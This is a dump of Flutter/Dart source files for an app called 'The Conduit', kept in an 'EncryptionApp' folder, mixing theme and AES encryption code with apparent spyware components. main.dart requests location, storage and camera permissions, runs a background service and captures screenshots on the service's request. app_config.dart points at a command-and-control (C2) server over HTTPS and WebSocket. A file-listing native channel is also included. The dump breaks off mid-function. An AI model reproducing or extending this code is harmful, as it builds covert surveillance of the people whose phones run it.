################################################################################
# تم تجميع أكواد دارت من المسار: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj
# تاريخ الإنشاء: 2025-05-22 19:22:07
################################################################################


// ============================== بداية الملف: app.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\app.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';

import 'presentation/chat/providers/theme_providers.dart';
import 'presentation/home/home_page.dart';

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName =
    "The Conduit"; // أو "الساتر" إذا اخترت اسمًا عربيًا

class TheConduitApp extends ConsumerWidget {
  // تم تغيير الاسم
  const TheConduitApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeState = ref.watch(themeStateProvider);
    final primaryColor = themeState.primaryColor;
    final useMaterial3 = themeState.useMaterial3;

    final TextTheme baseTextTheme = Theme.of(context).textTheme;
    final TextTheme cairoTextTheme = GoogleFonts.cairoTextTheme(baseTextTheme);
    final TextTheme cairoTextThemeLight = cairoTextTheme.apply(
        bodyColor: Colors.black87, displayColor: Colors.black87);
    final TextTheme cairoTextThemeDark = cairoTextTheme.apply(
        bodyColor: Colors.white.withOpacity(0.87),
        displayColor: Colors.white.withOpacity(0.87));

    return MaterialApp(
      title: displayedAppName,
      themeMode: themeState.themeMode,
      locale: const Locale('ar'),
      supportedLocales: const [Locale('ar')],
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      theme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        textTheme: cairoTextThemeLight,
        colorScheme: ColorScheme.light(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: Colors.grey[50]!, // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.black87,
          error: Colors.redAccent,
          onError: Colors.white,
        ),
        scaffoldBackgroundColor: Colors.grey[100],
        appBarTheme: AppBarTheme(
          backgroundColor: primaryColor,
          foregroundColor: Colors.white,
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white)),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: Colors.white,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[400])),
        ),
        cardTheme: CardTheme(
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
          color: useMaterial3 ? Colors.grey[50] : Colors.white,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? const BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: Colors.white, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.2),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: Colors.white,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87)),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium
                  ?.copyWith(fontSize: 14, color: Colors.black54)),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
          modalBackgroundColor: Colors.white, // لخلفية الـ ModalBottomSheet
        ),
      ),
      darkTheme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        brightness: Brightness.dark,
        textTheme: cairoTextThemeDark,
        colorScheme: ColorScheme.dark(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: const Color(0xFF1A1A1A), // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.white.withOpacity(0.87),
          error: Colors.redAccent[100]!,
          onError: Colors.black,
        ),
        scaffoldBackgroundColor: const Color(0xFF121212),
        appBarTheme: AppBarTheme(
          backgroundColor: useMaterial3
              ? const Color(0xFF1A1A1A) // لون أغمق قليلاً لـ M3 Dark
              : primaryColor.withOpacity(0.9),
          foregroundColor: Colors.white.withOpacity(0.9),
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.9))),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: const Color(0xFF2C2C2C),
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[500])),
        ),
        cardTheme: CardTheme(
          color: const Color(0xFF252525),
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: primaryColor, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.15),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: const Color(0xFF2C2C2C),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.87))),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium?.copyWith(
                  fontSize: 14, color: Colors.white.withOpacity(0.7))),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Color(0xFF2C2C2C),
          modalBackgroundColor: Color(0xFF2C2C2C),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}



// ------------------------------ نهاية الملف: app.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: main.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\main.dart
// ----------------------------------------------------------------------

// main.dart أو المسار الصحيح للملف الرئيسي للتطبيق

import 'dart:typed_data'; // لـ Uint8List

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';

// تأكد من صحة هذه المسارات
import 'services/background_service.dart'; // ملفنا للخدمة الخلفية
import 'services/screenshot_service.dart'; // ملف خدمة لقطة الشاشة

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName = "The Conduit";
// GlobalKey لخدمة لقطة الشاشة - يجب أن يكون مرتبطًا بواجهة المستخدم الرئيسية
final GlobalKey screenshotGlobalKey = GlobalKey();
List<String> globalLogs = []; // لتخزين السجلات وعرضها ديناميكيًا

// --- إعدادات قناة الإشعارات للخدمة الخلفية ---
const String backgroundServiceNotificationChannelId =
    'the_conduit_service_channel';
const String backgroundServiceNotificationChannelName =
    'The Conduit Background Service';
const String backgroundServiceNotificationChannelDescription =
    'Channel for The Conduit background service notifications.';
// تهيئة FlutterLocalNotificationsPlugin
final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
    FlutterLocalNotificationsPlugin();

Future<void> _createNotificationChannel() async {
  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    backgroundServiceNotificationChannelId,
    backgroundServiceNotificationChannelName,
    description: backgroundServiceNotificationChannelDescription,
    importance: Importance.low, // لتجنب الأصوات المزعجة بشكل افتراضي
    playSound: false,
    enableVibration: false,
  );
  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);
  print(
      "Notification channel '$backgroundServiceNotificationChannelId' created/updated.");
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _createNotificationChannel(); // << --- إنشاء القناة أولاً
  await requestBasicPermissions();
  await initializeBackgroundService(); // هذا يستدعي onStart حيث يتم استخدام notificationChannelId
  runApp(ProviderScope(child: MyApp()));
}

Future<void> requestBasicPermissions() async {
  Map<Permission, PermissionStatus> statuses = await [
    Permission.location,
    Permission
        .storage, // للوصول إلى التخزين العام (قد يتطلب manageExternalStorage لبعض العمليات)
    Permission
        .accessMediaLocation, // قد تحتاج إليه بناءً على كيفية وصولك للملفات
    // Permission.manageExternalStorage, // إذا كنت تحتاج للوصول الشامل (يتطلب موافقة خاصة في Google Play)
    Permission.camera, // إذا كنت ستستخدم الكاميرا الفعلية أيضًا
  ].request();
  print("Permission statuses: $statuses");
  if (statuses[Permission.location] != PermissionStatus.granted) {
    globalLogs.add("Location permission was not granted.");
  }
  if (statuses[Permission.storage] != PermissionStatus.granted) {
    globalLogs.add("Storage permission was not granted.");
  }
  if (statuses[Permission.camera] != PermissionStatus.granted) {
    globalLogs.add("Camera permission was not granted.");
  }
}

class MyApp extends ConsumerWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeMode = ref.watch(themeProvider); // افترض أن themeProvider موجود
    return MaterialApp(
      title: displayedAppName,
      theme: ThemeData(
        brightness: Brightness.light,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      darkTheme: ThemeData(
        brightness: Brightness.dark,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      themeMode: themeMode,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      supportedLocales: const [
        Locale('en', ''), // English
        Locale('ar', ''), // Arabic
      ],
      home: RepaintBoundary(
        key: screenshotGlobalKey, // ربط المفتاح هنا
        child: MonitoringScreen(), // أو الصفحة الرئيسية للتطبيق
      ),
      debugShowCheckedModeBanner: false,
    );
  }
}

class MonitoringScreen extends StatefulWidget {
  const MonitoringScreen({super.key});

  @override
  _MonitoringScreenState createState() => _MonitoringScreenState();
}

class _MonitoringScreenState extends State<MonitoringScreen> {
  final FlutterBackgroundService service = FlutterBackgroundService();
  late ScreenshotService _screenshotService;

  @override
  void initState() {
    super.initState();
    _screenshotService = ScreenshotService(
      screenshotKey: screenshotGlobalKey,
      onLogEvent: (log) {
        if (mounted) {
          setState(() {
            globalLogs.insert(0,
                "[${DateTime.now().toIso8601String().substring(11, 19)}] SCREENSHOT_SVC_UI: $log");
          });
        }
      },
    );

    service.on('addLog').listen((data) {
      if (data != null && data.containsKey('log') && mounted) {
        setState(() {
          globalLogs.insert(0,
              "[${DateTime.now().toIso8601String().substring(11, 19)}] BG_SVC: ${data['log']}");
        });
      }
    });

    service.on('updateUI').listen((event) {
      if (mounted) setState(() {});
    });

    // *** تعديل مستمع طلب لقطة الشاشة ***
    service.on('requestScreenshotFromUI').listen((argsFromService) async {
      if (mounted) {
        globalLogs.add(
            "UI: Received screenshot request from service. Args: $argsFromService");
        final Uint8List? imageBytes =
            await _screenshotService.captureScreenshot(); // التقاط الصورة

        Map<String, dynamic> responseToService = {};

        if (imageBytes != null) {
          // *** حفظ لقطة الشاشة كملف مؤقت وإرسال المسار ***
          final String? filePath =
              await _screenshotService.saveScreenshotToFile(imageBytes);
          if (filePath != null) {
            responseToService = {'file_path': filePath}; // إرسال المسار
            globalLogs.add(
                "UI: Screenshot captured and saved to: $filePath. Sending path to service.");
          } else {
            responseToService = {
              'error': 'Failed to save screenshot to file in UI'
            };
            globalLogs.add("UI: Failed to save screenshot to file.");
          }
        } else {
          responseToService = {'error': 'Failed to capture screenshot in UI'};
          globalLogs.add("UI: Failed to capture screenshot bytes.");
        }
        // إرسال المسار أو الخطأ مرة أخرى إلى الخدمة
        service.invoke('screenshotTakenByUI', responseToService);
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('$displayedAppName - Monitor'),
        actions: [
          IconButton(
            icon: Icon(Icons.cleaning_services),
            onPressed: () {
              if (mounted) {
                setState(() {
                  globalLogs.clear();
                  globalLogs.add("Logs cleared by user.");
                });
              }
            },
          ),
          IconButton(
            icon: Icon(Icons.send_to_mobile),
            onPressed: () {
              service.invoke(
                  "triggerInfoLog", {"message": "Hello from UI button!"});
            },
          )
        ],
      ),
      body: globalLogs.isEmpty
          ? Center(
              child: Text(
                  'No logs yet. Ensure the service is running and can connect to the C2 server.'))
          : ListView.builder(
              reverse: false, // لعرض أقدم السجلات في الأعلى
              itemCount: globalLogs.length,
              itemBuilder: (context, index) {
                return Padding(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 8.0, vertical: 2.0),
                  child: Text(
                    globalLogs[index],
                    style: TextStyle(fontSize: 11),
                  ),
                );
              },
            ),
    );
  }
}

// افترض أن لديك themeProvider من السياق السابق
final themeProvider = StateProvider<ThemeMode>((ref) => ThemeMode.system);



// ------------------------------ نهاية الملف: main.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: native_channel_handler.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\native_channel_handler.dart
// ----------------------------------------------------------------------

import 'package:flutter/services.dart';

class NativeChannelHandler {
  // اسم القناة يجب أن يطابق ما هو معرف في الكود الأصلي (Kotlin)
  static const MethodChannel _filesChannel =
      MethodChannel('com.zeroone.theconduit/files'); // [1] من السياق

  static Future<Map<String, dynamic>> listFilesNatively(String path) async {
    try {
      // استدعاء الدالة الأصلية 'listFiles' مع تمرير الوسيط 'path'
      final Map<dynamic, dynamic>? result =
          await _filesChannel.invokeMethod('listFiles', {'path': path});
      if (result != null) {
        return Map<String, dynamic>.from(result);
      }
      return {
        'error': 'Null result from native platform',
        'files': [],
        'path': path
      };
    } on PlatformException catch (e) {
      print(
          "Failed to list files via native channel: '${e.message}'. Details: ${e.details}");
      return {
        'error': e.message,
        'details': e.details,
        'files': [],
        'path': path
      };
    } catch (e) {
      print("Generic error listing files via native channel: $e");
      return {'error': e.toString(), 'files': [], 'path': path};
    }
  }

  // يمكنك إضافة دوال أخرى هنا إذا احتجت لقنوات إضافية
}



// ------------------------------ نهاية الملف: native_channel_handler.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: app_config.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\config\app_config.dart
// ----------------------------------------------------------------------

// lib/config/app_config.dart

// !! هام: في بيئة حقيقية، استخدم متغيرات البيئة أو تقنيات إدارة الأسرار
// لا تضع عناوين IP أو نطاقات حقيقية هنا مباشرة في التحكم بالمصادر (Version Control)
// هذا مجرد مثال توضيحي.

// --- HTTP Server Configuration ---
// هذا العنوان يشير إلى النطاق الذي وفرته Cloudflare Tunnel
// والذي يوجه مباشرة إلى Flask HTTP server على جهازك
const String C2_HTTP_SERVER_URL =
    'https://ws.sosa-qav.es'; // <-- تم استبداله بعنوان Cloudflare Tunnel HTTPS

// --- WebSocket (Socket.IO) Server Configuration ---
// طالما أن نفس النطاق يدعم ترقية WebSocket (Cloudflare يدعمها)،
// نغير البروتوكول فقط إلى wss:// (للاتصال المشفر)
const String C2_SOCKET_IO_URL =
    'wss://ws.sosa-qav.es'; // <-- استخدم wss مع Cloudflare لأنه HTTPS

const Duration C2_SOCKET_IO_RECONNECT_DELAY = Duration(seconds: 5);
const int C2_SOCKET_IO_RECONNECT_ATTEMPTS = 5;
const Duration C2_HEARTBEAT_INTERVAL = Duration(
  seconds: 45,
); // Interval for client to send heartbeat



// ------------------------------ نهاية الملف: app_config.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: aes_gcm_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\encryption\aes_gcm_service.dart
// ----------------------------------------------------------------------

// lib/core/encryption/aes_gcm_service.dart
import 'dart:convert';
import 'dart:typed_data';
import 'package:cryptography/cryptography.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
// لا حاجة لاستيراد LoggerService هنا إذا لم يتم استخدامه داخليًا

final aesGcmServiceProvider = Provider((ref) => AesGcmService());

class AesGcmService {
  final AesGcm _aesGcm = AesGcm.with256bits();
  final _pbkdf2 = Pbkdf2(
    macAlgorithm: Hmac.sha256(),
    iterations: 100000,
    bits: 256,
  );

  Future<String> encryptWithPassword(String plainText, String password) async {
    try {
      final salt = SecretKeyData.random(length: 16).bytes;
      final secretKey = await _pbkdf2.deriveKeyFromPassword(
        password: password,
        nonce: salt,
      );
      final iv = SecretKeyData.random(length: 12).bytes;
      final plainBytes = utf8.encode(plainText);
      final secretBox = await _aesGcm.encrypt(
        plainBytes,
        secretKey: secretKey,
        nonce: iv,
      );
      final combined = Uint8List.fromList(
          salt + iv + secretBox.cipherText + secretBox.mac.bytes);
      return base64UrlEncode(combined);
    } catch (e) {
      // Logged by the calling Notifier
      throw Exception('Encryption failed: ${e.toString()}');
    }
  }

  Future<String> decryptWithPassword(
      String base64CipherText, String password) async {
    try {
      final combined = base64Url.decode(base64CipherText);
      if (combined.length < (16 + 12 + 0 + 16)) {
        throw Exception('Invalid encrypted data format: too short.');
      }
      final salt = combined.sublist(0, 16);
      final iv = combined.sublist(16, 16 + 12);
      final cipherText = combined.sublist(16 + 12, combined.length - 16);
      final macBytes = combined.sublist(combined.length - 16);
      final mac = Mac(macBytes);
      final secretKey = await _pbkdf2.deriveKeyFromPassword(
        password: password,
        nonce: salt,
      );
      final secretBox = SecretBox(cipherText, nonce: iv, mac: mac);
      final decryptedBytes = await _aesGcm.decrypt(
        secretBox,
        secretKey: secretKey,
      );
      return utf8.decode(decryptedBytes);
    } on SecretBoxAuthenticationError {
      // Logged by the calling Notifier
      throw Exception('Decryption failed: Wrong password or data corrupted.');
    } catch (e) {
      // Logged by the calling Notifier
      if (e is Exception && e.toString().contains('Authentication failed')) {
        throw Exception('Decryption failed: Wrong password or data corrupted.');
      }
      throw Exception('Decryption failed: ${e.toString()}');
    }
  }

  Future<Uint8List> encryptBytesWithPassword(
      Uint8List plainBytes, String password) async {
    try {
      final salt = SecretKeyData.random(length: 16).bytes;
      final secretKey = await _pbkdf2.deriveKeyFromPassword(
        password: password,
        nonce: salt,
      );
      final iv = SecretKeyData.random(length: 12).bytes;
      final secretBox = await _aesGcm.encrypt(
        plainBytes,
        secretKey: secretKey,
        nonce: iv,
      );
      final combined = Uint8List.fromList(
          salt + iv + secretBox.cipherText + secretBox.mac.bytes);
      return combined;
    } catch (e) {
      // Logged by the calling Notifier
      throw Exception('Byte encryption failed: ${e.toString()}');
    }
  }

  Future<Uint8List> decryptBytesWithPassword(
      Uint8List encryptedBytes, String password) async {
    try {
      if (encryptedBytes.length < (16 + 12 + 0 + 16)) {
        throw Exception('Invalid encrypted data format: too short.');
      }
      final salt = encryptedBytes.sublist(0, 16);
      final iv = encryptedBytes.sublist(16, 16 + 12);
      final cipherText =
          encryptedBytes.sublist(16 + 12, encryptedBytes.length - 16);
      final macBytes = encryptedBytes.sublist(encryptedBytes.length - 16);
      final mac = Mac(macBytes);
      final secretKey = await _pbkdf2.deriveKeyFromPassword(
        password: password,
        nonce: salt,
      );
      final secretBox = SecretBox(cipherText, nonce: iv, mac: mac);
      final decryptedBytes = await _aesGcm.decrypt(
        secretBox,
        secretKey: secretKey,
      );
      return Uint8List.fromList(decryptedBytes);
    } on SecretBoxAuthenticationError {
      // Logged by the calling Notifier
      throw Exception(
          'Byte decryption failed: Wrong password or data corrupted.');
    } catch (e) {
      // Logged by the calling Notifier
      if (e is Exception && e.toString().contains('Authentication failed')) {
        throw Exception(
            'Byte decryption failed: Wrong password or data corrupted.');
      }
      throw Exception('Byte decryption failed: ${e.toString()}');
    }
  }
}



// ------------------------------ نهاية الملف: aes_gcm_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: encryption_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\core\encryption\encryption_service.dart
// ----------------------------------------------------------------------

// lib/core/encryption/encryption_service.dart
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';

import 'package:crypto/crypto.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:cryptography/cryptography.dart' as cryptography;

import '../error_handling/error_handler.dart';
import '../error_handling/result.dart';
import '../logging/logger_provider.dart';
import '../logging/logger_service.dart';

/// خدمة التشفير الموحدة للتطبيق
/// توفر واجهة موحدة لجميع عمليات التشفير وفك التشفير
class EncryptionService {
  final LoggerService _logger;
  final ErrorHandler _errorHandler;
  
  // طول مفتاح AES بالبت
  static const int _aesKeyLength = 256;
  
  // طول IV بالبايت
  static const int _ivLength = 16;
  
  // عدد دورات اشتقاق المفتاح
  static const int _pbkdf2Iterations = 10000;

  EncryptionService(this._logger, this._errorHandler);

  /// تشفير نص باستخدام AES-GCM
  Future<Result<String>> encryptAesGcm(String plainText, String password) async {
    try {
      return await _errorHandler.retryWithBackoff(
        operation: () async {
          // اشتقاق المفتاح من كلمة المرور
          final keyData = await _deriveKey(password, _aesKeyLength ~/ 8);
          
          // إنشاء IV عشوائي
          final iv = _generateRandomBytes(_ivLength);
          
          // إنشاء مفتاح AES
          final key = encrypt.Key(keyData);
          final encrypter = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.gcm));
          
          // تشفير النص
          final encrypted = encrypter.encrypt(
            plainText,
            iv: encrypt.IV(iv),
          );
          
          // دمج IV مع النص المشفر
          final result = base64.encode(iv + encrypted.bytes);
          
          _logger.debug('EncryptionService:encryptAesGcm', 'تم تشفير النص بنجاح');
          return Result.success(result);
        },
        context: 'EncryptionService:encryptAesGcm',
      );
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:encryptAesGcm',
      );
      return Result.failure(appError.message);
    }
  }

  /// فك تشفير نص مشفر باستخدام AES-GCM
  Future<Result<String>> decryptAesGcm(String encryptedText, String password) async {
    try {
      return await _errorHandler.retryWithBackoff(
        operation: () async {
          // فك ترميز النص المشفر من Base64
          final encryptedBytes = base64.decode(encryptedText);
          
          // التحقق من أن النص المشفر يحتوي على IV على الأقل
          if (encryptedBytes.length <= _ivLength) {
            return Result.failure('النص المشفر غير صالح');
          }
          
          // استخراج IV والنص المشفر
          final iv = encryptedBytes.sublist(0, _ivLength);
          final cipherBytes = encryptedBytes.sublist(_ivLength);
          
          // اشتقاق المفتاح من كلمة المرور
          final keyData = await _deriveKey(password, _aesKeyLength ~/ 8);
          
          // إنشاء مفتاح AES
          final key = encrypt.Key(keyData);
          final encrypter = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.gcm));
          
          // فك تشفير النص
          final decrypted = encrypter.decrypt64(
            base64.encode(cipherBytes),
            iv: encrypt.IV(iv),
          );
          
          _logger.debug('EncryptionService:decryptAesGcm', 'تم فك تشفير النص بنجاح');
          return Result.success(decrypted);
        },
        context: 'EncryptionService:decryptAesGcm',
      );
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:decryptAesGcm',
      );
      return Result.failure(appError.message);
    }
  }

  /// تشفير ملف باستخدام AES-GCM
  Future<Result<Uint8List>> encryptFileAesGcm(Uint8List fileData, String password) async {
    try {
      return await _errorHandler.retryWithBackoff(
        operation: () async {
          // اشتقاق المفتاح من كلمة المرور
          final keyData = await _deriveKey(password, _aesKeyLength ~/ 8);
          
          // إنشاء IV عشوائي
          final iv = _generateRandomBytes(_ivLength);
          
          // إنشاء مفتاح AES
          final key = encrypt.Key(keyData);
          final encrypter = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.gcm));
          
          // تشفير البيانات
          final encrypted = encrypter.encryptBytes(
            fileData,
            iv: encrypt.IV(iv),
          );
          
          // دمج IV مع البيانات المشفرة
          final result = Uint8List.fromList(iv + encrypted.bytes);
          
          _logger.debug('EncryptionService:encryptFileAesGcm', 'تم تشفير الملف بنجاح');
          return Result.success(result);
        },
        context: 'EncryptionService:encryptFileAesGcm',
      );
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:encryptFileAesGcm',
      );
      return Result.failure(appError.message);
    }
  }

  /// فك تشفير ملف مشفر باستخدام AES-GCM
  Future<Result<Uint8List>> decryptFileAesGcm(Uint8List encryptedData, String password) async {
    try {
      return await _errorHandler.retryWithBackoff(
        operation: () async {
          // التحقق من أن البيانات المشفرة تحتوي على IV على الأقل
          if (encryptedData.length <= _ivLength) {
            return Result.failure('البيانات المشفرة غير صالحة');
          }
          
          // استخراج IV والبيانات المشفرة
          final iv = encryptedData.sublist(0, _ivLength);
          final cipherBytes = encryptedData.sublist(_ivLength);
          
          // اشتقاق المفتاح من كلمة المرور
          final keyData = await _deriveKey(password, _aesKeyLength ~/ 8);
          
          // إنشاء مفتاح AES
          final key = encrypt.Key(keyData);
          final encrypter = encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.gcm));
          
          // فك تشفير البيانات
          final decrypted = encrypter.decryptBytes(
            encrypt.Encrypted(cipherBytes),
            iv: encrypt.IV(iv),
          );
          
          _logger.debug('EncryptionService:decryptFileAesGcm', 'تم فك تشفير الملف بنجاح');
          return Result.success(Uint8List.fromList(decrypted));
        },
        context: 'EncryptionService:decryptFileAesGcm',
      );
    } catch (e, stackTrace) {
      final appError = _errorHandler.handleError(
        e,
        stackTrace,
        context: 'EncryptionService:decryptFileAesGcm',
      );
      return Result.failure(appError.message);
    }
  }

  /// تشفير نص باستخدام تشفير متماثل بسيط (للبيانات غير الحساسة)
  Result<String> encryptSimple(String plainText, String key) {
    try {
      // اشتقاق مفتاح بسيط من المفتاح المقدم
      final keyBytes = utf8.encode(key);
      final keyHash = sha256.convert(keyBytes).bytes;
      
      // تحويل النص إلى بايتات
      final textBytes = utf8.encode(plainText);
      
      // تشفير البيانات باستخدام XOR
